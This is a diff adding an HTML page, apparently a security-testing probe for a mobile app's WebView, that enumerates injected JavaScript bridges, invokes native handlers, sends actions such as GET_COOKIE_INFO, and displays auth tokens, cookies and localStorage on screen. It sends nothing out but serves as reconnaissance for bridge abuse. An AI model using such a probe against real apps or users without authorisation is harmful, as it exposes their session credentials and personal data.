@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>grabmex://EXPRESS — JavaScript Bridge Enumeration</title>
+</head>
+<body>
+    <pre id="output">Initializing bridge enumeration...</pre>
+    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+    <script>eruda.init();</script>
+    <script>
+        var output = document.getElementById('output');
+        var lines = [];
+
+        function log(text) {
+            lines.push(text);
+            output.textContent = lines.join('\n');
+        }
+
+        function logSection(title) {
+            log('\n========================================');
+            log('  ' + title);
+            log('========================================\n');
+        }
+
+        function inspect(label, obj) {
+            if (typeof obj === 'undefined') {
+                log('[MISS] ' + label + ' is undefined');
+                return;
+            }
+            var type = obj === null ? 'null' : typeof obj;
+            log('[FOUND] ' + label + '  [' + type + ']');
+            if (type === 'string' || type === 'number' || type === 'boolean') {
+                log('  = ' + JSON.stringify(obj).substring(0, 500));
+            } else if (type === 'function') {
+                var src = String(obj);
+                var isNative = src.indexOf('[native code]') !== -1;
+                log('  ' + (isNative ? '[NATIVE] ' : '[JS] ') + src.substring(0, 200));
+            } else if (type === 'object' && obj !== null) {
+                try {
+                    var keys = Object.getOwnPropertyNames(obj);
+                    log('  Properties (' + keys.length + '): ' + keys.join(', '));
+                    keys.slice(0, 20).forEach(function(k) {
+                        try {
+                            var v = obj[k];
+                            var t = v === null ? 'null' : typeof v;
+                            if (t === 'function') {
+                                var s = String(v);
+                                log('    .' + k + '()  ' + (s.indexOf('[native code]') !== -1 ? '[NATIVE]' : '[JS]'));
+                            } else if (t === 'object' && v !== null) {
+                                var subKeys = Object.getOwnPropertyNames(v);
+                                log('    .' + k + '  [object] keys=[' + subKeys.slice(0, 10).join(', ') + ']');
+                            } else {
+                                log('    .' + k + '  [' + t + '] = ' + JSON.stringify(v).substring(0, 150));
+                            }
+                        } catch(e) { log('    .' + k + '  [error] ' + e.message); }
+                    });
+                } catch(e) { log('  [error] ' + e.message); }
+            }
+        }
+
+        setTimeout(function() {
+            log('URL: ' + location.href);
+            log('User-Agent: ' + navigator.userAgent);
+            log('Timestamp: ' + new Date().toISOString());
+
+            // 1. Token Injection — window.grabUser
+            logSection('1. Token Injection (window.grabUser)');
+            inspect('window.grabUser', window.grabUser);
+
+            // 2. Flutter InAppWebView Bridge
+            logSection('2. Flutter InAppWebView Bridge');
+            inspect('window.flutter_inappwebview', window.flutter_inappwebview);
+
+            if (window.flutter_inappwebview && window.flutter_inappwebview.callHandler) {
+                log('\n[TEST] Calling HelpCenterBridge with test ticket ID...');
+                try {
+                    var result = window.flutter_inappwebview.callHandler('HelpCenterBridge', 'test-ticket-id');
+                    if (result && typeof result.then === 'function') {
+                        result.then(function(r) { log('[RESPONSE] HelpCenterBridge returned: ' + JSON.stringify(r)); })
+                              .catch(function(e) { log('[ERROR] HelpCenterBridge error: ' + e); });
+                    } else {
+                        log('[RESPONSE] HelpCenterBridge returned: ' + JSON.stringify(result));
+                    }
+                } catch(e) { log('[ERROR] HelpCenterBridge call failed: ' + e.message); }
+            }
+
+            // 3. WebView Callback Bridge (postMessage)
+            logSection('3. WebView Callback Bridge (postMessage)');
+            inspect('window.webViewCallback', window.webViewCallback);
+
+            if (window.webViewCallback) {
+                log('\n[TEST] Setting up onmessage listener...');
+                window.webViewCallback.onmessage = function(event) {
+                    log('[RECEIVED] webViewCallback message:');
+                    log('  ' + (typeof event.data === 'string' ? event.data : JSON.stringify(event.data)).substring(0, 500));
+                };
+
+                var actions = [
+                    'DETECT_ADDRESS',
+                    'GET_COOKIE_INFO',
+                    'NAVIGATED_WITHIN_WEBVIEW'
+                ];
+                actions.forEach(function(action) {
+                    log('[SEND] Posting action: ' + action);
+                    try {
+                        window.webViewCallback.postMessage(JSON.stringify({
+                            action: action,
+                            scope: 'MEX'
+                        }));
+                        log('  Sent successfully');
+                    } catch(e) { log('  [ERROR] ' + e.message); }
+                });
+            }
+
+            // 4. App Context
+            logSection('4. App Context');
+            inspect('window.appContext', window.appContext);
+            inspect('window.notifyMobile', window.notifyMobile);
+
+            // 5. Token and Auth Data
+            logSection('5. Token and Authentication Data');
+            var tokenKeys = [
+                'grabUser', '__grabToken', '__grabAuth', 'accessToken', 'authToken',
+                'sessionToken', 'mexConfig', 'grabConfig', 'merchantId', 'storeId'
+            ];
+            tokenKeys.forEach(function(key) {
+                if (typeof window[key] !== 'undefined') {
+                    inspect('window.' + key, window[key]);
+                }
+            });
+
+            // 6. Cookie Inspection
+            logSection('6. Cookies');
+            log(document.cookie || '(no cookies accessible)');
+
+            // 7. LocalStorage Inspection
+            logSection('7. LocalStorage');
+            try {
+                var storageKeys = Object.keys(localStorage);
+                log('Keys (' + storageKeys.length + '): ' + storageKeys.join(', '));
+                storageKeys.slice(0, 10).forEach(function(k) {
+                    log('  ' + k + ' = ' + localStorage.getItem(k).substring(0, 200));
+                });
+            } catch(e) { log('[error] ' + e.message); }
+
+            // 8. Full Non-Default Property Scan (JS Bridge Sniper lite)
+            logSection('8. Non-Default Window Properties');
+            var baseline = new Set();
+            var frame = document.createElement('iframe');
+            frame.style.display = 'none';
+            document.documentElement.appendChild(frame);
+            try {
+                var w = frame.contentWindow;
+                for (var k in w) baseline.add(k);
+                Object.getOwnPropertyNames(w).forEach(function(k) { baseline.add(k); });
+            } catch(e) {}
+            try { document.documentElement.removeChild(frame); } catch(e) {}
+            if (baseline.size < 200) {
+                for (var k in window) {
+                    try {
+                        if (typeof window[k] === 'function' && String(window[k]).indexOf('[native code]') !== -1) baseline.add(k);
+                    } catch(e) { baseline.add(k); }
+                }
+            }
+
+            var injected = [];
+            for (var k in window) { if (!baseline.has(k)) injected.push(k); }
+            try { Object.getOwnPropertyNames(window).forEach(function(k) { if (!baseline.has(k) && injected.indexOf(k) === -1) injected.push(k); }); } catch(e) {}
+            injected.sort();
+
+            log('Baseline: ' + baseline.size + ' properties');
+            log('Injected: ' + injected.length + ' non-default properties\n');
+
+            injected.forEach(function(key) {
+                try {
+                    var val = window[key];
+                    var type = val === null ? 'null' : typeof val;
+                    var isNative = false;
+                    if (type === 'function') isNative = String(val).indexOf('[native code]') !== -1;
+                    if (type === 'object' && val !== null) {
+                        try {
+                            var subKeys = Object.getOwnPropertyNames(val);
+                            isNative = subKeys.some(function(sk) {
+                                try { return typeof val[sk] === 'function' && String(val[sk]).indexOf('[native code]') !== -1; } catch(e) { return false; }
+                            });
+                        } catch(e) {}
+                    }
+                    var flag = isNative ? '[BRIDGE] ' : '         ';
+                    log(flag + 'window.' + key + '  [' + type + ']');
+                } catch(e) { log('         window.' + key + '  [error]'); }
+            });
+
+            logSection('Enumeration Complete');
+            log('Total injected: ' + injected.length);
+            log('Bridges detected: ' + injected.filter(function(k) {
+                try {
+                    var v = window[k]; var t = typeof v;
+                    if (t === 'function') return String(v).indexOf('[native code]') !== -1;
+                    if (t === 'object' && v !== null) {
+                        return Object.getOwnPropertyNames(v).some(function(sk) {
+                            try { return typeof v[sk] === 'function' && String(v[sk]).indexOf('[native code]') !== -1; } catch(e) { return false; }
+                        });
+                    }
+                } catch(e) {} return false;
+            }).length);
+
+        }, 800);
+    </script>
+</body>
+</html>
